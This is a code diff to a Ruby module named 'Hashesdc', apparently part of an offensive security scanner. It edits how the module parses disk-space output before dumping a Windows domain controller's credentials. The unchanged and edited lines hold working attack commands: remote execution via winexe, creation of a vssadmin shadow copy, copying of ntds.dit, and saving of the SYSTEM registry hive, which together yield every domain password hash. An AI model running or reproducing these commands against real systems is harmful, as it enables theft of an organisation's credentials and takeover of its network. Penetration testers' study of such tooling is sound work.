@@ -122,10 +122,12 @@ class Hashesdc < Poet::Scanner
 
 				space = winexe(smboptions, "CMD /C dir #{@ntds_drive}#{@ntds}\\ntds.dit")
 
-				free = /Dir\(s\)\s+([0-9,\.]+)\sbytes free/m.match(space)[1]
-				file_size = /File\(s\)\s+([0-9,\.]+)\s+bytes/m.match(space)[1]
-				file_size = file_size.gsub!(/[,\.]/, '')
-				if free.gsub!(/[,\.]/, '').to_i > file_size.to_i
+        space.encode!('UTF-8', 'UTF-8', :invalid => :replace, :replace => '')
+
+        free = /Dir\(s\)\s+(.*?)\sbytes free/m.match(space)[1]
+				file_size = /File\(s\)\s+(.*?)\s+bytes/m.match(space)[1]
+				file_size = file_size.gsub!(/[^0-9]/, '')
+				if free.gsub!(/[^0-9]/, '').to_i > file_size.to_i
 
 					# Create Shadow copy
 					vss_create = winexe(smboptions, "CMD /C vssadmin create shadow /for=#{@ntds_drive}")
@@ -134,13 +136,12 @@ class Hashesdc < Poet::Scanner
 					# Check if created, get volume name and copy the ntds.dit
 					if vss_create =~ /Successfully created shadow copy for/m
 
-						# Rip out id and name for shadow copy
+						# Rip out id and name for shadow c opy
 						vss_volume_id = /Shadow Copy ID: ({.*})/.match(vss_create)[1]
 						vss_volume_name = /Shadow Copy Volume Name: (.*)\s/.match(vss_create)[1].chomp
 					
 						# Copy files
-						print_status("Copying ntds.dit and sys...")
-						cmd = "CMD /C copy #{vss_volume_name}#{@ntds}\\ntds.dit #{@drive}#{@drop_path}\\ntds.dit && reg.exe save HKLM\\SYSTEM #{@drive}#{@drop_path}\\sys"
+ 						cmd = "CMD /C copy #{vss_volume_name}#{@ntds}\\ntds.dit #{@drive}#{@drop_path}\\ntds.dit && reg.exe save HKLM\\SYSTEM #{@drive}#{@drop_path}\\sys"
 						vss_copy = winexe(smboptions, cmd)
 
 						# If files are copied...
